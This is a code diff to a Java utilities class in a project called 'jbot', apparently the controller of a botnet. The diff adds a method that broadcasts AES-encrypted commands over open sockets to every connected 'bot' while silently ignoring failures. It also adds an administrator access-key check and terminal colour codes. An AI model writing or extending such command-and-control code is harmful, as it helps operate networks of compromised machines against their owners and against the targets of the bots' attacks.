@@ -1,15 +1,29 @@
 package me.aaronakhtar.jbot;
 
+import me.aaronakhtar.jbot.crypto.Aes;
+import me.aaronakhtar.jbot.file_manager.files.AccessKeysFile;
 import me.aaronakhtar.jbot.objects.Bot;
 import me.aaronakhtar.jbot.objects.ConnectionType;
-import me.aaronakhtar.jbot.threads.handlers.BotHandler;
 
 import java.io.BufferedWriter;
 import java.io.IOException;
-import java.net.ServerSocket;
+import java.io.OutputStreamWriter;
 import java.net.Socket;
 
 public class Utilities {
+
+    public static void executeCommandToNetwork(String c){
+                                // could use nonblocking sockets, however I'm fine with this.
+        for (Bot bot : Main.connectedBots){
+            try {
+                final BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(bot.getSocket().getOutputStream()));
+                writer.write(Aes.encrypt(c, Main.encryptionKey));
+                writer.flush();
+            }catch (Exception e){
+                //
+            }
+        }
+    }
 
     public static boolean isSocketAlive(Socket socket){
         try{
@@ -51,6 +65,10 @@ public class Utilities {
         }
     }
 
+    public static boolean isKeyAdministrator(String k){
+        return AccessKeysFile.getAccessKeys().get(0).equalsIgnoreCase(k);
+    }
+
     public static void handleException(Exception e){
 
         e.printStackTrace();
@@ -71,6 +89,9 @@ public class Utilities {
         YELLOW("\u001b[33m"),
         BLUE("\u001b[34m"),
         MAGENTA("\u001b[35m"),
+        GREEN_BG("\u001b[42m"),
+        RED_BG("\u001b[41;1m"),
+        WHITE_BG("\u001b[47;1m"),
         CYAN("\u001b[36m"),
         WHITE("\u001b[37m"),
         CLEAR("\033[H\033[2J"),
